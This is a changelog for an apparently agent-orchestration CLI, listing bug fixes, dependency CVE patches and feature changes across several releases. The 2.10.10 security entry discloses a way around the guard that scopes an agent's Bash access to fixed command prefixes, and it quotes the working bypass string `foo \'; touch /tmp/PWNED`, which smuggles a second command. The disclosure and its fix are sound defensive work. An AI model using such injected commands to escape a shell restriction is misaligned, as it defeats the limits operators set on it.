- orgrt: mid-run role replacement — `org_respawn_role` lets a boss/coordinator
  swap a role's adapter/model or spawn a replacement sub-agent live, on crash
  or budget exhaustion, instead of retrying the same config. Backed by new
  `RunningOrg.roleSlots` per-role lifecycle state, a bounded replacement
  budget allocator, drain/force-stop/state-preservation for the outgoing
  agent, checkpoint v2 (round-trips role-slot generation, respawn count,
  overrides, retired usage), and an audited receipt of each respawn.
  `org_list_runtime_options` reports available adapters/models for a role.
  Boss-only, config-gated.
- memory-kg: scoped entity identity, a claims ledger recording how each
  claim was obtained (and ranking on that), enforced graph integrity,
  indexed adjacency, and origin-support lookups.

### Fixed

- monograph: collision-resistant symbol IDs (File/Folder/Document node IDs
  keyed on exact path; namespace/arrow-fn/variable nodes minted via
  symbolId), consistent cache/DB recovery, PageRank caches correctly scoped
  to connection + graph revision, community clustering over the committed
  graph instead of raw parse output, one consistent higher-is-better score
  convention across query paths, rename paths resolved against the repo
  root, and `GRAPH_REPORT.md` no longer indexes itself into the graph it
  describes.
- orgrt: `TaskDag.merge()` now rejects cycles instead of silently
  deadlocking, and correctly allows merging into a `done` target (previously
  every terminal target was rejected, including completed work) while still
  rejecting `cancelled`/`failed`/`split`/`merged` targets. Fixed cross-org
  message drop and sender-identity spoofing under deferred spawn, an
  org-wide budget bug, a `startOrg` race, a pending-question watchdog gap,
  a concurrency-cap bug, approval-cache keys colliding across different
  call args for the same tool, tasks being marked `running` before their
  assignee was resolved/verified, and `org resume-from` now refuses to
  double-run against a live `serve` daemon (with a pidfile lock added to
  `org serve` itself).
- knowledge/doc search: the `doc search` and `knowledge_search` KG-triplet
  result fusion silently discarded the synthetic result id — a spread
  ordering bug (`{ id, kind, ...raw }` let `raw`'s own `id` win) meant the
  id returned for feedback/citation was `raw`'s bridge-entry id in a
  different namespace, not the intended `kg:<i>:source|relation|target`
  key. Fixed in both `doc.ts` and `knowledge-tools.ts`, with regression
  coverage for each.
- ui: dashboard org-stop now writes to the actual polled stopfile path
  (was writing to a location `org serve` never checked), and artifact
  reads are scoped to `.monomind`.
- **#222**: the orgs run-log watcher crashed with `Cannot read properties
  of undefined (reading 'close')` whenever the underlying `fs.watch()`
  failed synchronously (ENOSPC/EMFILE/a watched path disappearing) — its
  `chokidar.watch()` call passed `persistent: false`, routing into
  chokidar's one `setFsWatchListener()` branch that doesn't null-check a
  failed watch. Dropped `persistent: false` so it takes the already-guarded
  default branch instead. Regression test added.
- **#223**: `monograph search --format json` was returning the ASCII-table
  output instead of structured JSON.
- **#224**: `memory search` keyword-fallback scoring returned 0.00 instead
  of a real score when the vector path fell back to keyword matching.
- A stale test-only stub (`orgrt-server-auth.test.ts`) was missing the
  `orgs` field a since-merged per-org credential check now reads, crashing
  5/6 of its tests with an uncaught exception (mis-presenting as an
  180+ second "hang" rather than a fast failure).

## [2.10.11] — 2026-09-05

### Security

- 4 high + 2 moderate CVEs (`fast-uri` SSRF/host-confusion, `qs` array-limit
  bypass + DoS, `@xmldom/xmldom` XML fragment injection) were silently
  unpatched despite version floors in `package.json`'s `pnpm.overrides` —
  pnpm 10 stopped reading that field and had been ignoring it on every
  install. Migrated `overrides`/`onlyBuiltDependencies`/`peerDependencyRules`
  to `pnpm-workspace.yaml` (where pnpm 10+ actually reads them) and bumped
  the stale floors to patched versions. `pnpm audit --audit-level high`:
  9 vulnerabilities → 0 for this workspace's own installs. Also fixed
  `security:audit`/`security:fix`, which ran `npm audit` against a pnpm
  lockfile and failed with `ENOLOCK`.
- **Known residual risk, not fixable without a breaking migration**: the
  workspace-level fix above does not reach real downstream installs of the
  published `monomind`/`@monoes/monomindcli` packages — override/resolution
  fields only apply to the top-level installing project, never to a
  dependency's own declared overrides. A fresh `npm install monomind`
  still pulls a vulnerable `qs`/`body-parser` via `@monoes/mcp` and
  `@monoes/monograph`'s pinned Express 4 (its final 4.x release hard-pins
  `qs: ~6.15.1`; only Express 5 carries the fix, a breaking migration) and
  a vulnerable `sharp` via `@huggingface/transformers` (even its latest
  4.2.0 still depends on `sharp <0.35.0`; `npm audit` reports "No fix
  available" upstream). Verified via a real `pnpm pack` + `npm install`
  smoke test, not just the workspace's own `pnpm audit`.

### Fixed

- monograph: `DEFAULT_IGNORE` was missing common framework build/cache
  directories (`.next`, `.wrangler`, `.turbo`, `.nuxt`, `.svelte-kit`,
  `.vercel`, `.open-next`) — `monograph build` indexed generated bundles
  (which re-bundle `node_modules` code) alongside real source, inflating
  scanned file counts by >60% on affected projects and producing duplicate
  search results (#221).
- Dashboard (`monomind ui`): `ENOSPC` (system file-watcher limit reached)
  and any other `fs.watch`/`chokidar.watch` error crashed the whole process
  — none of the 6 watch call sites had an `'error'` listener, and Node's
  default behavior for an unhandled `EventEmitter` `'error'` event is to
  throw. Added a shared `watchSafely()` wrapper: logs a warning and
  disables that watcher instead of crashing (#220).
- `orgrt` server: the same root cause as above — `startOrgServer`'s
  `listen()` had no error handler, so a port-bind failure (e.g.
  `EADDRINUSE`) crashed the process instead of rejecting the startup
  promise. This was also the root cause of an intermittent crash in
  `tests/security/orgrt-server-cors.test.ts`, whose own port-selection
  helper had a separate close-then-rebind race; removed the race by
  passing port `0` directly to `startOrgServer` and reading the OS-assigned
  port back off the server.
- Cleared 5 biome formatting errors caught by the public-readiness audit
  (line-wrap style; no logic changes).

## [2.10.10] — 2026-09-04

### Security

- **Command-injection bypass in scoped Bash access for agent-exec sessions**
  — `hasUnsafeShellSyntax` (the guard behind `--allow-bash-prefix`, which
  scopes an agent's Bash access to an exact command prefix) didn't track
  backslash-escaping. A backslash-escaped quote outside real quotes was
  mistaken for a genuine quote-toggle, hiding a trailing `;`/`&`/`|`/
  backtick/`$(` from detection even though bash itself still executes it —
  verified live (`foo \'; touch /tmp/PWNED` slipped through). Fixed by
  tracking backslash-escaping per real bash quoting rules; added
  regression tests for the exact bypass plus two false-positive checks.

### Added

- `--allow-bash-prefix` on `monomind agent-exec` — scopes an agent-exec
  session's Bash tool to commands matching one or more exact prefixes,
  denying anything else (including a matching prefix followed by shell
  metacharacters).

### Fixed

- CI: `Tests` workflow's default Node bumped from 20 to 22 — `nanoid@6`
  (pulled in workspace-wide via vite/vitest) requires Node `^22 || ^24 ||
  >=26`, which had been silently failing every job's install step since
  at least 2026-09-02.
- The root `.claude/` tree and the npm-shipped
  `packages/@monomind/cli/.claude/` copy had diverged in two files
  (one each direction) — re-synced and verified byte-identical.
- 13 shipped Mastermind skill template files (`.claude/skills/mastermind-*`)
  had corrupted, self-duplicated content (a stray nested
  `monomind:start`/`monomind:end` wrapper around already-wrapped output),
  making the `claude` platform's install non-idempotent. Stripped the
  duplication in both the root and npm-shipped trees.
- `org-gate-hard-block.test.ts`: a test-cleanup race (`rmSync` running
  before `OrgBus`'s fire-and-forget disk writes had flushed) could fail
  with `ENOTEMPTY` under parallel test load.
- `init-e2e.test.ts`: updated a stale assertion that predated native Codex
  hooks becoming on-by-default (2026-09-02).

## [2.10.9] — 2026-09-02

### Changed

- **Graph-first navigation is now enforced on Kimi and OpenCode too** — the
  graph gate (first grep/search in a session blocked once until a monograph
  tool is called, then warn-only) previously ran only on Claude Code. Kimi's
  plugin now matches `Grep|Glob`, and OpenCode's plugin routes `grep`/`glob`
  through the same `pre-search` gate with a real session ID (previously
  empty, which silently disabled the gate there).
- **Persistent opt-out** for the graph gate:
  `.monomind/guidance/active-gates.json` → `{"graphGate": "off"}`,
  alongside the existing `MONOMIND_GRAPH_GATE=off` env var.
- CI: publish smoke test now runs on Node 20 and 26.

## [2.10.8] — 2026-09-02

### Fixed

- **Symbol names for Kotlin, Ruby, C++, and Dart** — these grammars declare
  no (or only partial) field names, so names fell back to raw node text
  (`class Foo {`, `int count()`, `compute(int x)`). Per-language name
  refiners now extract clean identifiers. Surfaced by the WASM migration:
  most of these grammars had never worked under the native binding, so the
  defect was previously invisible.
- **Spurious keyword symbols in Ruby** — the extractor no longer treats
  anonymous keyword tokens as symbols (tree-sitter-ruby types the `class`
  keyword token as a node of type `class`).
- CLI: `{org}-runstate.json` files are excluded from org config listing, so
  they no longer appear as phantom orgs.

## [2.10.7] — 2026-09-01

### Changed

- **Monograph now runs tree-sitter grammars as WebAssembly** instead of the
  native Node binding. Grammars are vendored as `.wasm` files
  (`@monoes/monograph` 1.6.0), so installs no longer need node-gyp, native
  prebuilds, or the 15 grammar packages as runtime dependencies — eliminating
  the entire class of ABI-mismatch and native-build failures (the dependency
  angle of #219). Parses are also faster: 14.1s vs 23.8s indexing this
  repository, with six previously silent grammar failures (C, C++, Dart,
  Kotlin, Ruby, Swift) now parsing correctly. Refs #219.

### Notes

- `.vue` files are now always parsed via `<script>`-block extraction with the
  TypeScript grammar; tree-sitter-vue is dropped (its external scanner cannot
  build to WASM without emscripten, and the extraction config was already
  TypeScript-typed).
- Grammar WASM files are refreshed with
  `node scripts/refresh-wasm.mjs` in `@monoes/monograph`.

## [2.10.6] — 2026-09-01

### Fixed

- Monograph: `.tsx` and `.jsx` files were parsed with tree-sitter's plain
  TypeScript grammar, producing recovered parse errors on any JSX syntax.
  They are now routed to the dedicated TSX grammar (language identity in the
  graph stays `typescript`). Refs #219.
- Monodesign: local Chrome teardown could report "closed" before releasing
  its forced debug port, so the next launch attached to a process still
  exiting and the CDP session failed. Teardown now waits (up to 5s) for the
  port listener to disappear.
- CLI: removed a stale dashboard test assertion for the retired budgets tab.

## [2.10.5] — 2026-08-29

### Fixed

- `orgrt`: `ClaudeAgentRunner` no longer wipes the child process environment
  or auto-loads interactive settings when spawning agents.

## [2.10.4] — 2026-08-28

### Changed

- Spreadsheet extraction is now opt-in. `monomind init` no longer downloads
  SheetJS; it explains how to install `xlsx` when `.xlsx`, `.xls`, or `.ods`
  support is needed.

## [2.10.3] — 2026-08-28

### Changed

- Maintenance release. No public API changes.

## [2.10.2] — 2026-08-27

### Fixed

- `doctor`'s Monograph and Vector Memory checks reported "Package not found" /
  "not installed" even when `@monoes/monograph` and `@monoes/memory` were
  correctly installed — the checks guessed relative `node_modules` paths that
  never matched how npm actually hoists dependencies (flat local installs,
  npx's isolated cache dir, and global installs all place `@monoes/*`
  packages as siblings, not nested under this package's `dist/` output).
  Both checks now resolve through Node's real ESM module resolution
  (`import.meta.resolve`) instead.
- Codex native hooks: `[[hooks.SessionStart]]` and `[[hooks.SessionEnd]]`
  entries were missing from the generated `.codex/config.toml` — only
  `PreToolUse`/`PostToolUse` were wired, so Codex projects never got session
  restore/persistence via the Monomind hook bridge. All four hook events are
  now generated when `--enable-hooks` is passed to `init --codex`.

## [2.10.1] — 2026-08-26

### Fixed

- `pi`/`pi-rpc` runners: removed a nonexistent `--approve` flag that made
  every turn fail immediately with "Unknown option: --approve" — confirmed
  live against pi 0.73.1's own `--help`, which lists no approve/trust/yolo
  option at all. `--mode json`/`--mode rpc` alone were verified not to block
  on an interactive trust prompt, so no replacement flag was needed.
- `kimicode` runner: the agent-file body (everything after the `---`
  frontmatter) could be empty — and kimi rejects that with "Missing prompt
  body" — for any bare `agent exec` call with no `--system-file` and no
  tools (e.g. `agent.ask`, `chat` without `--canvas`, `agent test`). Falls
  back to a minimal default system prompt when none is given.

## [2.10.0] — 2026-08-25

### Added

- **Agent Exec Protocol v1** (`doc/agent-exec-protocol.md`): a public,
  versioned subprocess contract exposing monomind's `AgentRunner` engine and
  org observe surface to external callers. First caller: mono-agent's
  `monoagentcli`.
  - `monomind agent exec --runtime <id> --prompt <text>`: one-shot agent
    turns over NDJSON stdout (`start`/`session`/`assistant`/`tool_call`/
    `tool_result`/`usage`/`result`/`error`/`done`), with `--tools-file`
    JSON-Schema tool definitions bridged to caller-side handlers over stdio
    — native tool wiring on SDK-backed runners (claude), fence-protocol
    fallback on the rest. Optional `--budget-usd` spend cap and `--timeout`
    wall-clock cap, both enforced with the same SIGTERM→kill escalation as
    orgrt.
  - `monomind agent scan --json [--installed]`: parallel runner detection
    across all known agent CLIs, honoring `<NAME>_CLI_BIN` overrides.
  - `monomind --version --json`: capability handshake
    (`agent-exec`/`agent-scan`/`org-json-v1`) so callers fail fast with an
    actionable upgrade hint against an incompatible monomind instead of a
    confusing parse error.
  - `--format json` added to existing org observe commands (`status`,
    `logs`, `report`, `costs`, `list`, `questions`, `gates`, `decisions`,
    `memory`) plus action results (`answer`/`approve`/`deny`/
    `gate-approve`/`gate-reject`); new `org events [--follow] [--since]`
    live-tails `bus.jsonl` as NDJSON.
  - Golden NDJSON transcript fixtures (`doc/agent-exec-protocol/fixtures/`)
    for caller-side contract tests without running monomind.

## [2.9.27] — 2026-08-24

### Added

- Evidence-gated platform adapters for all supported coding runtimes, with
  scoped plan/install/upgrade/uninstall operations, a read-only doctor, MCP
  diagnostics, portable Mastermind workflow routing, and generated
  compatibility documentation.

### Changed

- Deprecated platforms setup; it no longer installs SessionStart prompt
  injection or global plugin artifacts.

## [2.9.25] — 2026-08-23

### Fixed

- `monomind init --target codex --force` now repairs incomplete native-hook
  markers in existing `.codex/config.toml` files and preserves generated hook
  configuration while merging the status line.
- Final Biome diagnostics are resolved, including vector dimension validation
  in the memory quantizer.

## [2.9.24] — 2026-08-23

### Security

- Replaced the abandoned `ollama-ai-provider` (v1) dependency with the
  actively maintained `ollama-ai-provider-v2`, removing a vulnerable
  transitive `@ai-sdk/provider-utils` dependency.

### Added

- Native Codex `PreToolUse` and `PostToolUse` hooks are now generated by
  `monomind init`, including a project-local bridge to Monomind's shared hook
  runtime.

### Fixed

- Fresh hook processes no longer synchronously open the monograph database on
  the critical path, preventing false hook failures from the five-second hook
  timeout.
- Repository-wide Biome lint issues and invalid optional AI SDK dependency
  ranges were corrected.

## [2.9.23] — 2026-08-22

### Fixed

- `org gate-approve`/`org gate-reject` had no offline-queue fallback (unlike
  `org approve`/`org deny`/`org answer`) — a rejected or unreachable live
  daemon call hard-failed instead of resolving `gates.json` directly,
  permanently blocking the gate for any org run without a reachable
  live-delivery channel. (#213)
- `CodexAgentRunner` silently produced zero assistant text and zero token
  accounting against current codex CLI installs (v0.149.0+): the wire format
  moved from `session_configured`/`agent_message`/`token_count`/`task_complete`
  to an item-based `thread.started`/`item.completed`/`turn.completed` shape,
  and the runner recognized none of it — with `exitCode` still 0, nothing
  surfaced as an error either. Both wire formats are now parsed. (#178, #204)
- `CodexAgentRunner` buffered all of codex's stdout until the subprocess
  exited before parsing anything, so a turn longer than the 4-minute
  silent-stream watchdog yielded zero messages in time — abort, retry, kill,
  circuit breaker. Same bug class as the kimi/antigravity runners; rewritten
  to stream incrementally with a spawn-time liveness message. (#204)
- A bad merge left `packages/@monomind/cli` failing to compile (`tsc`
  errors from a stray `antigravity` field on the wrong config object, and a
  missing required field on another) — the real build (not just
  `--noEmit`) was broken on `main`. Fixed before this release.

### Changed — `swarm` + `hive-mind` renamed to `monoswarm` (clean break, no aliases)

The old names borrowed distributed-systems terms of art (`raft`, `byzantine`/`bft`,
`quorum`, `consensus`, `broadcast`) for what is actually in-process JSON-file
bookkeeping and single-process vote counting. That mismatch had accumulated ~40
separate disclaimer passages across docs, agent/skill/command files, and tool
descriptions, each re-explaining "this is not real Raft / not distributed."
Renamed everything to a vocabulary that means what the code does, so the honesty
notes shrink to one short clause per tool instead of a defensive paragraph
everywhere. `hive-mind` no longer exists as a separate concept — it is folded
into `monoswarm`. **This is a breaking change with no backward-compat shim.**

- CLI: `monomind swarm <sub>` → `monomind monoswarm <sub>` (same 5 subcommands:
  init/start/status/stop/scale).
- MCP tools: the 16 `swarm_*`/`hive-mind_*` tools become 13 `monoswarm_*` tools
  (`monoswarm_init/status/scale/health/shutdown/agent_add/join/leave/vote/notice/memory/audit_list/audit_verify`).
  `hive-mind_spawn` → `monoswarm_agent_add`, `hive-mind_broadcast` → `monoswarm_notice`
  (both renamed specifically because "spawn" and "broadcast" were the two names
  needing the heaviest disclaimers, and neither claim is true of the code).
- Vote strategies: `raft` → `majority`, `bft`/`byzantine` → `supermajority`,
  `quorum` → `unanimous` (preset) or `threshold` (custom `minVotes`). `gossip`
  and `crdt` — declared but never implemented — are deleted entirely rather than
  kept as rejected options.
- State: the two old files (`.monomind/swarm/swarm-state.json`,
  `.monomind/hive-mind/state.json`) are merged into a single
  `.monomind/monoswarm/state.json`. Old files are **not migrated** — they are
  abandoned in place; `monomind cleanup` now knows the legacy paths so they can
  be purged.
- Config: `monomind.config.json`'s `swarm` key → `monoswarm`; `SwarmConfig` type
  → `MonoswarmConfig`.
- `.claude/`: `agents/{swarm,hive-mind}/` merged into `agents/monoswarm/` (and 7
  renamed agent slugs, e.g. `swarm-pr` → `monoswarm-pr`); the three skills
  `swarm-orchestration`/`swarm-advanced`/`hive-mind-advanced` merged into one
  `monoswarm` skill; `commands/{swarm,hive-mind}/` merged into `commands/monoswarm/`.
- Docs: `doc/concepts/swarm.md` → `doc/concepts/monoswarm.md`, rewritten as one
  positive "how it works" explanation instead of five separate disclaimer
  passages; the scattered disclaimers in root/package `CLAUDE.md`, agent
  definitions, and generated CAPABILITIES.md were trimmed to match.
- Two pre-existing bugs fixed in passing: `claudemd-generator.ts` was emitting
  `Use raft consensus for hive-mind` into every generated project `CLAUDE.md` —
  the one place still asserting what every other doc disclaimed; and
  `guidance-tools.ts` listed 10 tool/command names that had never existed
  (`swarm_spawn`, `hive_mind_vote`, …).

**Upgrading:** update any script or CI step invoking `monomind swarm ...` to
`monomind monoswarm ...`, and any MCP client calling `swarm_*`/`hive-mind_*`
tools directly to the `monoswarm_*` equivalents above. Purge stale local state
with `monomind cleanup`.

## [2.9.22] — 2026-08-17

### Added (PR #167)
- **5 new subprocess-CLI org runtimes** — `grok`, `qwen`, `crush`, `copilot`, `pi`, each wrapping the corresponding vendor CLI the same way `codex`/`kimicode` already do (spawn, parse output, normalize into the shared `AgentRunner` stream). Wire protocols (flags, JSON event shapes) are sourced from public docs, not verified against a live install — see #178 for follow-up.
- **`pi-rpc` runtime** (opt-in alternate to `pi`) — keeps the `pi --mode rpc` subprocess alive for a whole mailbox session instead of respawning per turn, using a literal JSON schema pulled from pi-mono's own `rpc.md` source. Turn-completion detection is an explicitly-flagged best-effort heuristic — see #179.
- **`usage-proxy.ts`** — a generic loopback HTTP proxy that extracts token usage from OpenAI/Anthropic-shaped LLM traffic for CLIs (`crush`) that don't self-report it. Built and tested, but not yet wired into org/role config — see #177.
- **`org watch <org> <role> [--verbose] [--stats]`** — a thin, role-filtered live-tail of a role's assistant chat text, off the same bus event every runtime already emits. `--verbose` interleaves status/restart events; `--stats` shows a running token/cost ticker.
- Startup-hang fail-fast timer (45s, distinct from the 2h turn timeout) in all 5 new runners, plus confirmed trust-gate/telemetry env-var suppressions (`PI_TELEMETRY`, `PI_SKIP_VERSION_CHECK`, `CRUSH_DISABLE_PROVIDER_AUTO_UPDATE`).

### Fixed (found across 4 rounds of adversarial review of the above, same PR)
- pi-rpc: original spawn error was discarded before the ENOENT check could match it, hiding the "install pi" message behind a generic error.
- pi-rpc: the mid-session silence watchdog could kill a healthy role that was simply idle (waiting on its own mailbox) or blocked on `ask_human` — both are now correctly excluded from counting as "pi is wedged".
- pi-rpc: a SIGKILL escalation could be cancelled mid-grace-period by its own cleanup path, risking an orphaned process.
- `crush`/`grok`/`qwen`/`copilot`/`pi` runners: timer cleanup could be skipped entirely on a stdout stream error, leaking the turn timeout and orphaning the child process (now also killed on that path).
- `crush`: usage-proxy totals were reset every tool-call round instead of once per turn, discarding all but the last round's usage.
- `grok`/`qwen`: tool-result rounds after the first could silently lose all conversational context if session-id parsing ever failed.
- `usage-proxy`: Accept-Encoding wasn't stripped (a gzipped upstream response silently parsed to garbage → 0 usage forever); Anthropic's `input_tokens` (nested under `message.usage` on `message_start`) was never checked, and "last chunk wins" logic could erase an earlier chunk's field when a later chunk didn't repeat it.

### Known follow-ups
See #177 (wire up usage-proxy), #178 (install & validate all 6 CLI-backed runtimes incl. `codex`), #179 (verify pi-rpc's completion heuristic), #180 (confirm `crush --continue` session scoping), #181 (copilot has no usage accounting), #182 (session-lifetime `qwen-rpc`, blocked on confirming qwen's bidirectional wire format).

## [2.9.21] — 2026-08-16

### GitHub issue fixes
- **#156 — `control-start.cjs` adopt-loop silently adopted an auth-mismatched server after #150's own fix.** `probeStatus()` returns the string `'unauthorized'` (not `null`) for a server that answers but rejects the dashboard token — a non-empty string is truthy in JS, so the adopt loop treated a 401-rejecting server exactly like a healthy one, writing `pid:0` and leaving the mismatch in place instead of skipping past it to scan for an actually-adoptable server.
- **#158 — idle-nudge and `org_complete` guidance let the boss end a multi-phase goal after just one batch.** The idle-watchdog nudge offered only a binary choice ("call `org_complete`" or "reassign stalled work"), with no option for "nothing's stalled, but the goal has more scope left — dispatch the next batch instead." Combined with ambiguous "goal is achieved" wording that never distinguished "this batch" from "the org's full stated goal," the boss had no textual signal steering it away from over-eagerly ending a run with real scope remaining. Reworded the kickoff briefing, the idle-nudge (now a real three-way choice), and the `org_complete` tool description to make that distinction explicit.
- **#160 — `org approve`/`deny`/`answer`/`gate-approve` never sent the daemon auth credential on the live-delivery path.** `/api/answer-question`, `/api/set-approval`, and `/api/resolve-gate` all require an `x-monomind-cred` header; the client attached it correctly for `/api/xdeliver` but not these three, so every live delivery 401'd and silently fell back to the slower offline file-write path (only a warning printed — easy to miss).
- **#163 — `countSdkProcesses`/`reapOrphanedSdkProcesses` spammed console errors on Windows.** Both unconditionally shelled out to `pgrep`/`ps`, which don't exist on native Windows; the failure was caught, but `execSync` inherits stderr by default, so every lazy role spawn printed `'pgrep' is not recognized...` to the console. Now skips the shell-out entirely on `win32` (returns 0 / unknown) and silences inherited stderr on the platforms where the commands do exist.

### Added
- **`policy.autoApproveTools`** — a role's policy can now name specific sensitive actions (`Bash`, `WebFetch`, `WebSearch`, `org_complete`, …) it's pre-trusted for, bypassing the human-approval pause for just those actions on that role. Still subject to `allowTools`/`denyTools` and the policy engine's own decision — this only skips the "pause and wait for a human" step for actions the operator has explicitly opted the role into.

## [2.9.20] — 2026-08-15

### GitHub issue fixes (#155 follow-up)
- **Dashboard's `activeOrgs` gap-fill still couldn't detect a completed run after the first #155 fix** — the corrected event-string matching was right, but `run_events` (SQLite) is only populated by *live* event forwarding while a dashboard is connected, not backfilled from a run's actual history. A dashboard started after a run had already stopped never saw most (or any) of that run's events — including its terminal one — so the query had nothing to match. Replaced the whole event-scanning approach with a direct read of `runtime.json`'s own authoritative `status` field (the exact thing `monomind org status` reads), also treating a `"running"` record with a dead pid as not-active. Verified end-to-end against a real running server instance, not just unit tests.

## [2.9.19] — 2026-08-15

### Refactor (#122, PR #154)
- Pruned unwired memory consolidation subsystems (`ControllerRegistry`, `database-provider.ts`, `UnifiedMemoryService`, `TieredCacheManager`) that were maintained against mocks and never invoked by the live CLI or MCP runtime — net -3,244 lines. Fixed a build-breaking re-export of already-deleted functions introduced during the PR's own merge before shipping it.

### GitHub issue fixes (#155)
- **Dashboard's `activeOrgs` gap-fill never detected a completed run.** The SQLite path checked `type IN ('run:complete','org:complete','org:stop')` — daemon.ts never emits any of these; the real terminal signal is a `type:'status'` event with `msg:'org stopped'` or `reason:'org-complete'`, carried in the JSON-stringified `raw` column, not a dedicated type string. Every org's latest run was always reported active regardless of whether it had actually finished. The JSONL fallback (used when sql.js is unavailable) had the same stale `<org>/runs/` path bug already fixed in #138 for `statusline.cjs` — Org Runtime v2 writes `<org>/<runId>/bus.jsonl`, not a `runs/` directory. Both paths now match the real terminal signals/paths.

## [2.9.18] — 2026-08-15

### GitHub issue fixes (#149)

- **`org run --resume` no longer dies silently on a stale SDK session.** The reported symptom (org idle 10m, boss "unreachable", zero messages/tokens exchanged) traced to `resumeSessionId` being seeded from the checkpoint's persisted SDK session_id — which can legitimately no longer exist on the provider's side by resume time (the repro resumed ~8h after `org stop`). Any error on that first resumed call besides the turn-limit pattern was rethrown straight into the crash/backoff path: 3 attempts over ~21s, then a terminal crash that closes the mailbox — matching "Messages: 0" and "boss unreachable" exactly. Mirrors the existing turn-limit-recovery pattern: the first failure on a checkpoint-provided session id now drops it and retries once with a fresh session instead of crashing, bounded so a second, real failure still crashes normally.
- Note: the issue's own proposed root cause (mailboxes staying closed after `org stop`) was verified **not** to hold on current code — `finishStop()` snapshots the checkpoint before closing mailboxes specifically so this doesn't happen. A fix built on that diagnosis was drafted and discarded after it regressed the existing "no zombie agents on resume" invariant for genuinely crashed roles.

## [2.9.17] — 2026-08-15

### GitHub issue fixes (#152)

- **The org-stop drain-timeout audit event no longer hides which roles were cut off mid-work.** On a real 22-role org run, `org_complete` was called while six workers were still actively writing files; the 5-minute drain window let most finish, but at least one was still mid-write when it expired and got force-stopped — the resulting audit event said only "proceeding anyway," with no way to tell real in-progress work being cut off from idle-but-not-yet-reaped sessions. `finishStop()` now collects every role still `'running'` (mid-turn) at the moment the drain window expires, includes that roster in both the audit message and structured `data.stillActive`, and omits the "still active" suffix entirely when nothing was actually cut off.
- `org_complete`'s tool description now tells the boss to check `org_tasks` and avoid calling it while siblings have in-progress work, reaching the model at the exact moment it decides to call it.

## [2.9.16] — 2026-08-15

### GitHub issue fixes (#150)

- **`control-start.cjs` no longer trusts a live-but-auth-mismatched dashboard.** `probeStatus()` used to collapse "no server there" and "a server answered but rejected our dashboard-token" (401) into the same `null` result, so a live server left over from a prior port collision — up, but pairing-mismatched — was indistinguishable from a healthy one. It now returns a distinct `'unauthorized'` sentinel, and the "already running" check treats that as stale and restarts, same as a project or build mismatch.
- **`monomind org run` now actively verifies/heals the dashboard on every run**, instead of only trusting whatever `control.json` already had. It (re)invokes the project's own `.claude/helpers/control-start.cjs` if `monomind init` has set one up, so a stale/dead/mismatched dashboard self-heals per run, not only once at Claude Code `SessionStart`.

### Fix
- Synced a leftover cross-copy drift in `statusline.cjs` (root `.claude/`/`.gemini/` were missing the `getVersion` testability export that `packages/@monomind/cli/.claude/` already had, from #146/PR #147) — caught by this repo's own tree-parity check.

## [2.9.15] — 2026-08-15

### Critical fix — broken 2.9.14 publish (#148)

- **`monomind@2.9.14`/`@monoes/monomindcli@2.9.14` were published with 5 unresolved `workspace:*` dependencies and were uninstallable** (`npm error code EUNSUPPORTEDPROTOCOL`) — this release supersedes them via a correct `pnpm publish`, verified against the registry after publishing (all 5 previously-`workspace:*` deps resolve to real version numbers). `2.9.14` is deprecated on npm pointing here.
- **Closed a blind spot in the #130 publish guard** (`check-workspace-deps.mjs`) that let this through undetected: it only scanned `dependencies`/`devDependencies`/`peerDependencies`, missing 4 of the 5 affected deps (`@monoes/hooks`, `@monoes/mcp`, `@monoes/memory`, `@monoes/routing`), which live under `optionalDependencies`. It now scans that too.
- The actual #146 fix (statusline `getVersion()` on Windows) is included here as well — it shipped correctly in the 2.9.14 *source*, just not the broken publish.

## [2.9.14] — 2026-08-15

### GitHub issue fixes (#146)

- **#146 — `statusline.cjs` `getVersion()` always showed the `v1.0.6` placeholder on Windows.** The npm-global-prefix fallback only checked the Unix layout (`<prefix>/lib/node_modules/monomind/package.json`), but npm on Windows puts global packages directly under `<prefix>/node_modules/` — so the fallback silently failed on every Windows install and the hardcoded placeholder won. Now both layouts are checked in turn (Windows first, then macOS/Linux), and only when both miss does the placeholder remain.

## [2.9.13] — 2026-08-15

### GitHub issue fixes (#144)

- **#144 — `confirmPort()` decoupled from the SessionStart hook's 5s timeout.** #142/#143's liveness-based wait can legitimately take up to ~5 minutes (cold npx resolve, AV/filesystem contention right after an install), but it ran inline inside the same process the hook kills at 5s — so in real usage it almost always got truncated before confirmation ever completed, defeating those fixes and leaving `control.json` stuck on its pre-confirmation optimistic guess. `main()` now spawns the dashboard, writes the optimistic status, hands confirmation off to a second fully independent detached process, and exits immediately — matching this file's own module docstring, which wasn't actually true before this change. The new `runConfirm()` process is free to take as long as it legitimately needs without the hook's timeout ever touching it.

## [2.9.12] — 2026-08-14

### GitHub issue fixes (#142 follow-up)

- **#142 follow-up — `confirmPort()` now waits on liveness, not a fixed budget.** #142's 30s npx-fallback budget helps the common case, but a follow-up report found it's still occasionally too tight right after a fresh global reinstall — one run measured the server taking ~142s to report (vs. the normal ~5-9s), likely npm/AV-scan contention on a freshly-written `node_modules` tree, not registry resolve time. `CONFIRM_ATTEMPTS` is now a minimum grace period, not the hard budget: past it, `confirmPort()` only gives up once the child has actually exited — a live child that simply hasn't reported yet keeps getting the benefit of the doubt, up to a 5-minute absolute safety-net ceiling.

## [2.9.11] — 2026-08-14

### GitHub issue fixes (#143)

- **#143 — `confirmPort()`'s identity check couldn't survive #141's `shell: true` fix.** Under `shell: true`, `child.pid` is the wrapping `cmd.exe`'s pid, not the real dashboard server's — so the `rep.pid === child.pid` comparison against the server-reported pid (`BOUND_REPORT`) could never match on the npx-fallback path, no matter the timeout (#142's fix didn't help). The npx-fallback path always fell through to "server did not respond" and killed a server that was, in practice, already up. Identity was never really about the pid match: `BOUND_REPORT`'s path is already unique per invocation, so its mere presence with a valid port is sufficient proof of ownership. Dropped the pid comparison and switched `control.json` to record the real, server-reported pid (`rep.pid`) instead of `child.pid`.

## [2.9.10] — 2026-08-14

### GitHub issue fixes (#141 follow-up, #142)

- **#141 follow-up — `control-start.cjs` is now synced by `monomind init upgrade`.** It was never in the `HELPER_FILES` force-sync registry, so existing projects never picked up the #141 EINVAL fix automatically; users had to manually copy the file out of `node_modules`. Registered alongside `statusline.cjs`/`graphify-freshen.cjs` (force-synced, doctor-tracked, no fallback generator).
- **#142 — `confirmPort()`'s 10s window is now 30s for the `npx` fallback path.** Every other `findCliPath()` branch spawns `node` directly against an already-resolved path and pays no resolve cost, but the last-resort `npx monomind@latest ui` fallback pays npx's own first-time package resolve into its `_npx` cache — measured at ~12.4s cold vs ~3.4s warm. On a fresh install this killed the dashboard child as a false "orphan" before it could ever bind, exactly on the first-session case auto-start exists for.

